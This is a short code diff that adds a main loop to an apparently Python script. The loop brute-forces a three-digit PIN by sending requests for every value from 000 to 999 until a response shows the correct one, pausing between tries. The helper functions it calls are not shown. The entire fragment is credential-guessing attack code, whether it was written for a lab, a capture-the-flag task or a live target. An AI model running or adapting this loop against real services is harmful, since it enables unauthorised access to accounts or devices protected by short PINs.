@@ -58,3 +58,16 @@ def check_response(response, pin_str):
     else:
         print(f"Trying PIN {pin_str}")
         return False
+
+def main():
+    pin = 0
+    while pin < 1000:
+        request, pin_str = create_request(pin)
+        response = send_request(request)
+        
+        if check_response(response, pin_str):
+            print(f"Found correct PIN: {pin_str}")
+            break
+        
+        time.sleep(DELAY)
+        pin += 1
